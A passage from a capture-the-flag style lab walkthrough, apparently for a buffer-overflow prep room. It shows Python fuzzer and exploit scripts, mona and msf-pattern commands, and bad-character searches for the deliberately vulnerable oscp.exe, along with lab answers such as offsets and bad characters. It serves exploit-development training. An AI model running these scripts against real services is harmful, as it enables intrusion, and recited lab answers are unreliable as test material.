a1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""  # Any additional data to send after the payload (not used here)

# Construct the complete buffer to send
buffer = prefix + overflow + retn + padding + payload + postfix

# Create a TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Attempt to connect to the target IP and port
    s.connect((ip, port))
    print("Sending evil buffer...")  # Notify that the buffer is being sent
    # Send the buffer over the network to the target
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")  # Confirm that the buffer has been sent
except:
    # If the connection fails, print an error message
    print("Could not connect.")
```


25. In target machine. Immunity Debugger > Debug > Restart > Play.


26. Execute exploit.py

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 exploit.py
Sending evil buffer...
Done!
```


27. In Immunity Debugger. Note the ESP value.

![800](img/Pasted%20image%2020240827180310.png)


28. In Immunity Debugger. Run the mona command to compare the bin and ESP value.

`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`

![800](img/Pasted%20image%2020240827180432.png)


29. Based on the output 00 07 08 2e 2f a0 a1. Only use 00 07 2e a0 to be excluded in creating the bad chars. Edit the create.py.

```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00 07 2e a0".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```


```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00\x07\x2e\xa0

```

	Task 1
		b. In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW1?
			\x00\x07\x2e\xa0


30. In target machine. Immunity Debugger. Tell mona to update the bytearray.

`!mona bytearray -b "\x00\x07\x2e\xa0"`

![800](img/Pasted%20image%2020240827180752.png)


Jump to 624011AF

![800](img/Pasted%20image%2020240827183349.png)


31. In target machine. Immunity Debugger > Debug > Restart > Play.


32. Edit the exploit.py with the bad chars. Then execute the exploit.py.

```python
import socket  # Import the socket module to enable network communication

# Target details
ip = "target.local"  # The IP address or hostname of the target machine
port = 1337  # The port number on the target machine to connect to

# Buffer overflow exploit components
prefix = "OVERFLOW1 "  # Prefix to identify the start of the input buffer
offset = 1978  # Number of bytes to reach the return address (overwrite point)
overflow = "A" * offset  # Fills the buffer up to the return address with 'A's
retn = "BBBB"  # Placeholder for the return address, overwrites the EIP/RIP
padding = ""  # Any additional padding (not used in this example)
# Generated bad chars
payload = "\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""  # Any additional data to send after the payload (not used here)

# Construct the complete buffer to send
buffer = prefix + overflow + retn + padding + payload + postfix

# Create a TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Attempt to connect to the target IP and port
    s.connect((ip, port))
    print("Sending evil buffer...")  # Notify that the buffer is being sent
    # Send the buffer over the network to the target
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")  # Confirm that the buffer has been sent
except:
    # If the connection fails, print an error message
    print("Could not connect.")
```


31. Immunity Debugger. Compare using mona.

** Do not restart Immunity Debbuger.

`!mona compare -f C:\mona\oscp\bytearray.bin -a esp

![800](img/Pasted%20image%2020240823172948.png)


32. Immunity Debugger > Debug > Restart

![800](img/Pasted%20image%2020240827181522.png)


33. Use the command mona jmp, the esp and the excluded bad chars.

`!mona jmp -r esp -cpb '\x00\x07\x2e\xa0'`\


# Task 3 oscp.exe - OVERFLOW2

1. In Kali. Using Remmina, remote to target machine.

![800](img/Pasted%20image%2020240821141857.png)


2. In target machine. Right click Immunity Debugger > Run as administrator. File > Open > Desktop\\vulnerable-apps\\oscp\\oscp. Click red play button, will show Running. 

![800](img/Pasted%20image%2020240821141958.png)


4. In Kali. Open a terminal. NC to the target machine with port 1337. Type "HELP" to view the commands. Type "OVERFLOW2 test" to verify.

![800](img/Pasted%20image%2020240828164111.png)


5. In target machine. In the Immunity Debugger. Input the mona command.

`!mona config -set workingfolder c:\mona\%p`

![800](img/Pasted%20image%2020240828164155.png)


6. In Kali. Create a script, fuzzer.py.

```python
#!/usr/bin/env python3

import socket, time, sys  # Import necessary modules: socket for networking, time for delays, sys for exiting the script

# Define the target IP address or hostname
ip = "target.local"

# Define the target port number
port = 1337

# Set the timeout duration (in seconds) for the socket connection
timeout = 5

# Define a prefix to prepend to the payload being sent
prefix = "OVERFLOW2 "

# Initialize the payload with the prefix followed by 100 "A" characters
string = prefix + "A" * 100

# Start an infinite loop to continually send increasing payload sizes
while True:
    try:
        # Create a new socket object for IPv4 (AF_INET) and TCP (SOCK_STREAM)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set the timeout for the socket connection
            s.settimeout(timeout)
            
            # Connect to the target IP and port
            s.connect((ip, port))
            
            # Receive the initial response from the server (optional step to ensure connection)
            s.recv(1024)
            
            # Print the current size of the payload being sent (excluding the prefix)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            
            # Send the payload to the target server, encoding it as a Latin-1 byte string
            s.send(bytes(string, "latin-1"))
            
            # Receive the server's response (optional step to ensure the payload was sent)
            s.recv(1024)
    
    # If an exception occurs (e.g., the server crashes or connection fails), handle it here
    except:
        # Print the size of the payload that caused the crash and exit the script
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    
    # Increase the size of the payload by 100 "A" characters for the next iteration
    string += 100 * "A"
    
    # Wait 1 second before sending the next payload (to avoid overwhelming the server)
    time.sleep(1)

```


7. In Kali. Create a script, exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW2 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = ""           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


8. In target machine. Immunity Debugger > Debug > Restart > Play.


9. In Kali. Execute the fuzzer.py. The Immunity Debugger will crash and pause.

![800](img/Pasted%20image%2020240828164805.png)


10. Fuzzing crashed at 700 bytes. Create a pattern by adding 400 bytes, total of 1100 bytes. 

![800](img/Pasted%20image%2020240828164914.png)


11. Immunity Debugger showing EIP 41414141 overwritten with A(hex=41).

![800](img/Pasted%20image%2020240828164945.png)


12. In Kali. Create msf pattern.

`msf-pattern_create -l 1100`

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_create -l 1100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk
```


13. In Kali. Edit the script exploit.py and add the output of the msf-pattern.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW2 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


14. In target machine. Immunity Debugger > Debug > Restart > Play.


15. In Kali. Execute the exploit.py.

![800](img/Pasted%20image%2020240821150355.png)


16. Immunity Debugger. EIP 76413176.

![800](img/Pasted%20image%2020240828165216.png)


17. In Kali. Get the offset value of the EIP.

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_offset -l 1100 -q 76413176
[*] Exact match at offset 634
```

Alternative, get it from Immunity Debugger using mona command.

`!mona findmsp -distance 1100`

![800](img/Pasted%20image%2020240828165618.png)

EIP Offset is 634.

	Task 3
		a. What is the EIP offset for OVERFLOW2?
			634 


18. In Kali. Edit the exploit.py. Add the offset 634 and put a retn to be reflected, can use "BBBB"

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW2 "  # The command or identifier expected by the target service
offset = 634             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


19. In target machine. Immunity Debugger > Debug > Restart > Play.


20. In Kali. Execute exploit.py.

![800](img/Pasted%20image%2020240821152534.png)


21. Immunity Debugger, showing EIP was overwritten with 42424242 which is the "BBBB". Note the value ESP 0187FA30.

![800](img/Pasted%20image%2020240828170046.png)


22. In Immunity Debugger. Create a BADCHARS using mona. By default the syntax \\x00 is a BADCHAR.

`!mona bytearray -b "\x00"`

![800](img/Pasted%20image%2020240828170232.png)


23. Creating bad chars. In Kali. By using a python script. Generate a string of bad chars from \\x01 to \\xff.

```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00

```


24. Using the generated bad chars, copy and edit the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW2 "  # The command or identifier expected by the target service
offset = 634             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


25. In target machine. Immunity Debugger > Debug > Restart > Play.


26. Execute exploit.py

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 exploit.py
Sending evil buffer...
Done!
```


27. In Immunity Debugger. Note the ESP value.

![800](img/Pasted%20image%2020240828171734.png)


28. In Immunity Debugger. Run the mona command to compare the bin and ESP value.

`!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`

![800](img/Pasted%20image%2020240828171832.png)

mona Memory comparison results, item 0
 Address=0x0181fa30
 Status=Corruption after 34 bytes
 BadChars=00 23 24 3c 3d 83 84 ba bb
 Type=normal
 Location=Stack


29. Based on the output 00 23 24 3c 3d 83 84 ba bb. Only use 00 23 3c 83 ba to be excluded in creating the bad chars. Edit the create.py.


```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00 23 3c 83 ba".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```


```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
